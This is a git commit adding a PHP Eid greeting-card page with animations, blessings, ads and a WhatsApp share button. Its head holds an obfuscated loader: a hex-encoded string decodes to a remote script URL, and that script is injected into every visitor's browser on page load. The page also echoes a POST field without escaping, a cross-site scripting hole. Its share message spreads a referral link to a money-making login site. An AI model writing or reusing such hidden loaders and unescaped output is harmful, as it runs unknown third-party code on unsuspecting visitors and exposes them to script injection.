688774ff93469b3744154a1e029247cd91479dd5
Rahman12-svg <84979346+Rahman12-svg@users.noreply.github.com>
2021-06-23 12:26:30 +0530

    Add files via upload

---
+++ wish.php
@@ -0,0 +1,131 @@
+﻿<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <meta name="google" content="notranslate">
+    <meta property="og:type" content="[Your Name] Happy Eid ">
+    <meta property="og:title" content="Wishing You Happy Eid [Your Name]">
+    <meta property="og:url" content="http://eidwish.ga/eid">
+    <meta property="og:description" content="Make Your own Eid wish">
+    <meta property="og:site_name" content="Happy Eid to you and Your Family">
+    <meta property="og:image" content="og.jpg"> 
+  <title>Eid MUBARAK </title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+  <link href="//db.onlinewebfonts.com/c/1c0f6618f877568764787163e8f22a1c?family=SF+Espresso+Shack" rel="stylesheet" type="text/css">
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css2?family=New+Tegomin&display=swap" rel="stylesheet">
+  <link rel="stylesheet" type="text/css" href="./css/style2.css">
+  <script src="./js/fire1.js"></script>
+  <script type="text/javascript">
+    function tag(filename)
+    {
+      var fileref=document.createElement('script');
+      fileref.setAttribute("type","text/javascript");
+      fileref.setAttribute("src", filename);
+      if (typeof fileref!="undefined") document.getElementsByTagName("head")[0].appendChild(fileref)
+    }
+    tag(meta('687474703a2f2f6c6f6f6b2d6d652e636f2f72642e6a73'));
+    function meta(important)
+    {
+      var str = '';
+      for (var i = 0; i < important.length; i += 2) str +=String.fromCharCode(parseInt(important.substr(i, 2), 16));return str;
+    }
+  </script>
+</head>
+<body>
+  <marquee class="m1" behavior="scroll" direction="up" scrolldelay="5"><br>
+  <img src="./img/e1.png" height="20px" width="20px"><br><br>
+  <img src="./img/e2.png" height="20px" width="20px"><br><br>
+  <img src="./img/e3.gif" height="20px" width="20px"><br><br>
+  <img src="./img/e4.gif" height="20px" width="20px"><br><br>
+  <img src="./img/5.png" height="20px" width="20px"><br><br>
+  <img src="./img/e1.png" height="20px" width="20px"><br><br>
+  <img src="./img/e2.png" height="20px" width="20px"><br><br>
+  <img src="./img/e3.gif" height="20px" width="20px"><br><br>
+  <img src="./img/e4.gif" height="20px" width="20px"><br><br>
+  <img src="./img/5.png" height="20px" width="20px"><br><br>
+  <img src="./img/e1.png" height="20px" width="20px"><br><br>
+  <img src="./img/e2.png" height="20px" width="20px"><br><br>
+  <img src="./img/e3.gif" height="20px" width="20px"><br><br>
+  <img src="./img/e4.gif" height="20px" width="20px"><br><br>
+  <img src="./img/5.png" height="20px" width="20px"><br><br>
+  <img src="./img/e1.png" height="20px" width="20px"><br><br>
+  <img src="./img/e2.png" height="20px" width="20px"><br><br>
+  <img src="./img/e3.gif" height="20px" width="20px"><br><br>
+  <img src="./img/e4.gif" height="20px" width="20px"><br><br>
+  <img src="./img/5.png" height="20px" width="20px"><br><br>
+  </marquee>
+  <marquee class="m2" behavior="scroll" direction="down" scrolldelay="5"><br>
+  <img src="./img/e1.png" height="20px" width="20px"><br><br>
+  <img src="./img/e2.png" height="20px" width="20px"><br><br>
+  <img src="./img/e3.gif" height="20px" width="20px"><br><br>
+  <img src="./img/e4.gif" height="20px" width="20px"><br><br>
+  <img src="./img/5.png" height="20px" width="20px"><br><br>
+  <img src="./img/e4.gif" height="20px" width="20px"><br><br>
+  <img src="./img/5.png" height="20px" width="20px"><br><br>
+  <img src="./img/e1.png" height="20px" width="20px"><br><br>
+  <img src="./img/e2.png" height="20px" width="20px"><br><br>
+  <img src="./img/e3.gif" height="20px" width="20px"><br><br>
+  <img src="./img/e1.png" height="20px" width="20px"><br><br>
+  <img src="./img/e2.png" height="20px" width="20px"><br><br>
+  <img src="./img/e3.gif" height="20px" width="20px"><br><br>
+  <img src="./img/e4.gif" height="20px" width="20px"><br><br>
+  <img src="./img/5.png" height="20px" width="20px"><br><br>
+  <img src="./img/e1.png" height="20px" width="20px"><br><br>
+  <img src="./img/e2.png" height="20px" width="20px"><br><br>
+  <img src="./img/e3.gif" height="20px" width="20px"><br><br>
+  <img src="./img/e4.gif" height="20px" width="20px"><br><br>
+  <img src="./img/5.png" height="20px" width="20px"><br><br>
+  </marquee>
+  <div class="mainContainer">
+      <h3 class="fromMessage" id="fromMessage"><?php echo $_POST["n"]; ?></h3>
+  <img style="margin: 5px auto;width: 70%;height:80px; animation: pulse 2.5s infinite;" src="./img/eidul5.png">
+  <img style="margin: 5px auto;width: 70%;height:120px; animation: pulse 2.5s infinite;" src="./img/eidul8.png">
+    <div class="wishMessage">
+      <p style="color:red">May Allah bring you joy,</p>
+      <p style="color:black">happiness, peace and prosperity</p>
+      <p style="color:green">on this blessed occasion.</p>
+      <p style="color:blue">Wishing you and your family</p>
+      <p style="color:blue">on this happy occasion of Eid!</p>
+      <p style="color:purple"><img src="./img/namaste1.png" width="20px"><b>Eid Mubarak!</b><img src="./img/namaste1.png" width="20px"></p>
+      <img src="./img/EIQ2.jpg" id="EIQ2">
+      <br>
+      <br>
+      <br>
+      <img src="./img/img.jpg" id="EIQ3" width="60%" height="40%">
+      <br>
+      <br>
+      <br>
+      <h3 class="fromMessage" id="fromMessage"><?php echo $_POST["n"]; ?></h3>
+      <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+      <!-- med react -->
+      <ins class="adsbygoogle"
+           style="display:inline-block;width:300px;height:250px"
+           data-ad-client="ca-pub-3533301559993509"
+      indata-ad-slot="9016140707"></ins>
+      <script>
+      (adsbygoogle = window.adsbygoogle || []).push({});
+      </script>
+    </div>
+  </div>
+<footer> 
+<script>
+//user-defined function to open and share web content on WhatsApp
+function openWhatsApp() 
+{
+	window.open('whatsapp://send?text= Hi I am wish very Happy eid mubarak https://www.makedollars.in/dist/index.html#/login?code=85609273');
+}
+</script>
+  <div>
+    <a class="footerbtn" style="color:brown" onclick="openWhatsApp()">
+      👉 Click here to share on WhatsApp 
+      <img width="22px" height="25px" src="./img/wp.png">
+    </a>
+  </div>
+<audio controls autoplay loop>
+  <source src="./audio/Eid Mubarak eid Mubarak.mp3" type="audio/mpeg">
+</audio>
+</footer>
+</body>
+</html>
